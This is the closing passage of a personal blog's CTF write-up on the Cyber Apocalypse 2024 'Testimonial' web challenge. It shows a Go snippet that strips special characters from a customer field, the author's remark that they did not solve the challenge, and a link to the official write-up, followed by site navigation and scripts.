<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">for _, char := range []string{&#34;/&#34;, &#34;\\&#34;, &#34;:&#34;, &#34;*&#34;, &#34;?&#34;, &#34;\&#34;&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;|&#34;, &#34;.&#34;} {
		customer = strings.ReplaceAll(customer, char, &#34;&#34;)
	}

</code></pre></td></tr></table>
</div>
</div><p>NOTE: Beyond this point i did after the ctf , i did not solve this one.</p>
<p>Official writeup &raquo; <a class="link" href="https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/web/%5BEasy%5D%20Testimonial"  target="_blank" rel="noopener"
    >https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/web/%5BEasy%5D%20Testimonial</a></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/urchinsec-ctf-2024/">
        
        
            <div class="article-image">
                
                    <img src="/cover/urchinsec.png" loading="lazy" data-key="" data-hash="/cover/urchinsec.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Urchinsec ctf 2024</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/knightctf_2024/">
        
        
            <div class="article-image">
                
                    <img src="/cover/knightctf.jpg" loading="lazy" data-key="" data-hash="/cover/knightctf.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Knightctf_2024</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/irisctf_whats_my_password/">
        
        
            <div class="article-image">
                
                    <img src="/cover/iris.png" loading="lazy" data-key="" data-hash="/cover/iris.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Irisctf_whats_my_password</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hack_the_boo2023/">
        
        
            <div class="article-image">
                
                    <img src="/cover/htb.svg" loading="lazy" data-key="" data-hash="/cover/htb.svg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Hack_the_boo2023</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/blackhat_mea_2023/">
        
        
            <div class="article-image">
                
                    <img src="/cover/bh.png" loading="lazy" data-key="" data-hash="/cover/bh.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Blackhat_mea_2023</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="f0rk3b0mb/f0rk3b0mb.github.io"
    data-repo-id="R_kgDOJkJRlQ"
    data-category="General"
    data-category-id="DIC_kwDOJkJRlc4CbrS7"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="1"
    data-lang="en"
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('1');
            } else {
                setGiscusTheme('dark_dimmed');
            }
        }
    })();
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2023 - 
        
        2024 f0rk3b0mb
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
